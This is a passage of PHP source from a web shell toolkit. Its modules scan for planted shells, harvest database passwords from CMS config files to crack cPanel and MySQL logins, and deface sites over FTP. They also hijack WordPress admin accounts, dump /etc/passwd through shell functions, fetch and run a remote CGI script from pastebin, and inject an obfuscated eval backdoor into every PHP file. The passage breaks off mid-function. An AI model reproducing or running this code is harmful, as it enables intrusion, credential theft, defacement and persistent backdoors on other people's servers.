"Cgishell.pl","killer.php","changeall.php","2.php","Sh3ll.php","dz0.php","dam.php","user.php","dom.php","whmcs.php",
"vb.zip","r00t.php","c99.php","gaza.php","1.php","wp.zip"."wp-content/plugins/disqus-comment-system/disqus.php",
"d0mains.php","wp-content/plugins/akismet/akismet.php","madspotshell.php","Sym.php","c22.php","c100.php",
"wp-content/plugins/akismet/admin.php#","wp-content/plugins/google-sitemap-generator/sitemap-core.php#",
"wp-content/plugins/akismet/widget.php#","Cpanel.php","zone-h.php","tmp/user.php","tmp/Sym.php","cp.php",
"tmp/madspotshell.php","tmp/root.php","tmp/whmcs.php","tmp/index.php","tmp/2.php","tmp/dz.php","tmp/cpn.php",
"tmp/changeall.php","tmp/Cgishell.pl","tmp/sql.php","tmp/admin.php","cliente/downloads/h4xor.php",
"whmcs/downloads/dz.php","L3b.php","d.php","tmp/d.php","tmp/L3b.php","wp-content/plugins/akismet/admin.php",
"templates/rhuk_milkyway/index.php","templates/beez/index.php","admin1.php","upload.php","up.php","vb.zip","vb.rar",
"admin2.asp","uploads.php","sa.php","sysadmins/","admin1/","administration/Sym.php","images/Sym.php",
"/r57.php","/wp-content/plugins/disqus-comment-system/disqus.php","/shell.php","/sa.php","/admin.php",
"/sa2.php","/2.php","/gaza.php","/up.php","/upload.php","/uploads.php","/templates/beez/index.php","shell.php","/amad.php",
"/t00.php","/dz.php","/site.rar","/Black.php","/site.tar.gz","/home.zip","/home.rar","/home.tar","/home.tar.gz",
"/forum.zip","/forum.rar","/forum.tar","/forum.tar.gz","/test.txt","/ftp.txt","/user.txt","/site.txt","/error_log","/error",
"/cpanel","/awstats","/site.sql","/vb.sql","/forum.sql","/backup.sql","/back.sql","/data.sql","wp.rar/",
"wp-content/plugins/disqus-comment-system/disqus.php","asp.aspx","/templates/beez/index.php","tmp/vaga.php",
"tmp/killer.php","whmcs.php","tmp/killer.php","tmp/domaine.pl","tmp/domaine.php","useradmin/",
"tmp/d0maine.php","d0maine.php","tmp/sql.php","tmp/dz1.php","dz1.php","forum.zip","Symlink.php","Symlink.pl", 
"forum.rar","joomla.zip","joomla.rar","wp.php","buck.sql","sysadmin.php","images/c99.php", "xd.php", "c100.php",
"spy.aspx","xd.php","tmp/xd.php","sym/root/home/","billing/killer.php","tmp/upload.php","tmp/admin.php",
"Server.php","tmp/uploads.php","tmp/up.php","Server/","wp-admin/c99.php","tmp/priv8.php","priv8.php","cgi.pl/", 
"tmp/cgi.pl","downloads/dom.php","templates/ja-helio-farsi/index.php","webadmin.html","admins.php",
"/wp-content/plugins/count-per-day/js/yc/d00.php", "admins/","admins.asp","admins.php","wp.zip","wso2.5.1","pasir.php","pasir2.php","up.php","cok.php","newfile.php","upl.php",".php","a.php","crot.php","kontol.php","hmei7.php","jembut.php","memek.php","tai.php","rabit.php","indoxploit.php","a.php","hemb.php","hack.php","galau.php","HsH.php","indoXploit.php","asu.php","wso.php","lol.php","idx.php","rabbit.php","1n73ction.php","k.php","mailer.php","mail.php","temp.php","c.php","d.php","IDB.php","indo.php","indonesia.php","semvak.php","ndasmu.php","cox.php","as.php","ad.php","aa.php","file.php","peju.php","asd.php","configs.php","ass.php","z.php");
foreach ($shells as $shell){
$headers = get_headers("$url$shell"); // 
if (eregi('200', $headers[0])) {
echo "<a href='$url$shell'>$url$shell</a> <span class='found'>Done :D</span><br /><br/><br/>"; // 
$dz = fopen('shells.txt', 'a+');
$suck = "$url$shell";
fwrite($dz, $suck."\n");
}
}
echo "Shell [ <a href='./shells.txt' target='_blank'>shells.txt</a> ]</span>";
}
	
}
 elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						$i++;
						echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>Nemu ".$i." Cpanel by <font color=lime>OCT</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['do'] == 'smtp') {
	echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
				echo "SMTP port: <font color=lime>$smtp_port</font><br>";
				echo "SMTP user: <font color=lime>$smtp_user</font><br>";
				echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['do'] == 'auto_wp') {
	if($_POST['hajar']) {
		$title = htmlspecialchars($_POST['new_title']);
		$pn_title = str_replace(" ", "-", $title);
		if($_POST['cek_edit'] == "Y") {
			$script = $_POST['edit_content'];
		} else {
			$script = $title;
		}
		$conf = $_POST['config_dir'];
		$scan_conf = scandir($conf);
		foreach($scan_conf as $file_conf) {
			if(!is_file("$conf/$file_conf")) continue;
			$config = file_get_contents("$conf/$file_conf");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."posts";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
				$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
				echo "<div style='margin: 5px auto;'>";
				if($target == '') {
					echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
				} else {
					echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
				}
				if(!$update OR !$conn OR !$db) {
					echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
				} else {
					echo "<font color=lime>succsuccess ganti.</font><br>";
				}
				echo "</div>";
				mysql_close($conn);
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit Title+Content WordPress</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='pwnd By cor0.id' placeholder='New Title'><br><br>
		Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
		<span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
		<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
		<input type='submit' name='hajar' value='Cr00tzz!' style='width: 450px;'><br>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
} elseif($_GET['do'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='cor0.id'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
}elseif($_GET['do'] == 'cpftp_auto') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							//
						} else {
							echo "[+] username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
							$ftp_conn = ftp_connect(gethostbyname($_SERVER['HTTP_HOST']));
							$ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
							if((!$ftp_login) || (!$ftp_conn)) {
								echo "[+] <font color=red>Login Gagal</font><br><br>";
							} else {
								echo "[+] <font color=lime>Login sucsuccessfont><br>";
								$fi = htmlspecialchars($_POST['file_deface']);
								$deface = ftp_put($ftp_conn, "public_html/$fi", $_POST['deface'], FTP_BINARY);
								if($deface) {
									$i++;
									echo "[+] <font color=lime>Deface susuccess/font><br>";
									if(function_exists('posix_getpwuid')) {
										$domain_cp = file_get_contents("/etc/named.conf");	
										if($domain_cp == '') {
											echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
										} else {
											preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
											foreach($domains_cp[1] as $dj) {
												$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
												$user_cp_url = $user_cp_url['name'];
												if($user_cp_url == $ucp) {
													echo "[+] <a href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
													break;
												}
											}
										}
									} else {
										echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
									}
								} else {
									echo "[-] <font color=red>Deface Gagal</font><br><br>";
								}
							}
							//echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>ssuccess Deface ".$i." Cpanel by <font color=lime>OCT.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		Filename: <br>
		<input type='text' name='file_deface' placeholder='index.php' value='index.php' style='width: 450px;'><br>
		Deface Page: <br>
		<input type='text' name='deface' placeholder='http://www.web-yang-udah-do-deface.com/filemu.php' style='width: 450px;'><br>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Hajar'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
}
 elseif($_GET['do'] == 'cgi') {
	$cgi_dir = mkdir('idx_cgi', 0755);
	$file_cgi = "idx_cgi/cgi.izo";
	$isi_htcgi = "AddHandler cgi-script .izo";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = file_get_contents("http://pastebin.com/raw.php?i=XTUFfJLg");
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, $cgi_script);
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
	echo "<iframe src='idx_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
} elseif($_GET['do'] == 'fake_root') {
	ob_start();
	function reverse($url) {
		$ch = curl_init("http://domains.yougetsignal.com/domains.php");
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
			  curl_setopt($ch, CURLOPT_HEADER, 0);
			  curl_setopt($ch, CURLOPT_POST, 1);
		$resp = curl_exec($ch);
		$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
		$array = explode(",,", $resp);
		unset($array[0]);
		foreach($array as $lnk) {
			$lnk = "http://$lnk";
			$lnk = str_replace(",", "", $lnk);
			echo $lnk."\n";
			ob_flush();
			flush();
		}
			  curl_close($ch);
	}
	function cek($url) {
		$ch = curl_init($url);
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		$resp = curl_exec($ch);
		return $resp;
	}
	$cwd = getcwd();
	$ambil_user = explode("/", $cwd);
	$user = $ambil_user[2];
	if($_POST['reverse']) {
		$site = explode("\r\n", $_POST['url']);
		$file = $_POST['file'];
		foreach($site as $url) {
			$cek = cek("$url/~$user/$file");
			if(preg_match("/pwnd/i", $cek)) {
				echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
		User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
		Domain: <br>
		<textarea style='width: 450px; height: 250px;' name='url'>";
		reverse($_SERVER['HTTP_HOST']);
		echo "</textarea><br>
		<input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
		</form><br>
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
	}
} elseif($_GET['do'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}elseif($_GET['do'] == 'injectcode') {?><center>
		<form method='POST'>
        <table>
        <tr>
            <td width="100" class="title">
                        Directory
                    </td>
                    <td>
                         <input type='text' style="width: 400px;" name="pathtomass" value="<?php echo getcwd().$SEPARATOR; ?>" />
                    </td>
					
                </tr>
                <tr>
                <td class="title">
                    Mode
                </td>
                <td>
                        <select style="width: 400px;" name="mode" class="box">
                            <option value="Apender">Apender</option>
                            <option value="Overwriter">Overwriter</option>
                        </select>
                </td>
                </tr>
                <tr>
                    <td class="title">
                        File Type
                    </td>
                    <td>
                        <input type="text" class="box" name="filetype" value="php" onBlur="if(this.value=='')this.value='php';" />
                    </td>
                </tr>
                <tr>
			<td>Create A backdoor by injecting this code in every php file of current directory</td>
		</tr>
                
                <tr>
                    <td colspan="2">
                        <textarea name="injectthis" cols="110" rows="10" class="box"><?php echo base64_decode("PD9waHANCmV2YWwoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoInkwelRVSWwzZHcySlZrcFVpdFdzVGkxTHpORklyOHJNUzh0SkxFblZTRW9zVGpVemlVOUpUYzVQU2RWSXk4eEpqVTlQTFlsUHpzOHJTYzByS2RaUXlpZ3BLYkRTMXk5SUxDNUpUY3JNMDB2T3o5VXZTaXpYVC9VemN5d3NUTXhXMGdRQzYxb0EiKSkpOw0KPz4="); ?></textarea>
                    </td>
                </tr>
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="but" value="Inject "/>
                    </td>
                </tr>
        </form>
        </table><div id="showinject"</div> <?php
$filetype = $_POST['filetype'];
$mode = "a"; 
if($_POST['mode'] == 'Apender')
$mode = "a";
 if($_POST['mode'] == 'Overwriter')
$mode = "w";
if (is_dir($_POST['pathtomass'])) 
{
$lolinject = $_POST['injectthis'];
$mypath = $_POST['pathtomass'] .$directorysperator. "*.".$filetype;
if(substr($_POST['pathtomass'], -1) == "\\")
$mypath = $_POST['pathtomass'] . "*.".$filetype;
foreach (glob($mypath) as $injectj00) 
{
if($injectj00 == __FILE__)
continue;
$fp=fopen($injectj00,$mode);
if (fputs($fp,$lolinject))
echo '<br><font class=txt size=3>'.$injectj00.' was injected<br></font>';
else
echo 'failed to inject '.$injectj00.'<br>';
}
}
else 
echo '<b>'.$_POST['pathtomass'].' is not available!</b>';
}

elseif($_GET['do'] == 'passwbypass') {
	echo '<center>Bypass etc/passw With:<br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>Bypass User With : <table style="width:50%">
<tr>
    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';


if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
//

//
} elseif($_GET['do'] == 'auto_dwp') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$scan = $_POST['link_config'];
		$link_config = scandir($scan);
		$script = htmlspecialchars($_POST['script']);
		$user = "coro.id";
		$pass = "coro.id";
		$passx = md5($pass);
		foreach($link_config as $dir_config) {
			if(!is_file("$scan/$dir_config")) continue;
			$config = file_get_contents("$scan/$dir_config");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."users";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				if($target == '') {					
					echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
				} else {
					echo "[+] $target <br>";
				}
				$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
				if(!$conn OR !$db OR !$update) {
					echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
					mysql_close($conn);
				} else {
					$site = "$target/wp-login.php";
					$site2 = "$target/wp-admin/theme-install.php?upload";
					$b1 = anucurl($site2);
					$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
					$b = lohgin($site, $site2, $user, $pass, $wp_sub);
					$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
					$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
					$www = "m.php";
					$fp5 = fopen($www,"w");
					fputs($fp5,$upload3);
					$post2 = array(
							"_wpnonce" => "$anu2",
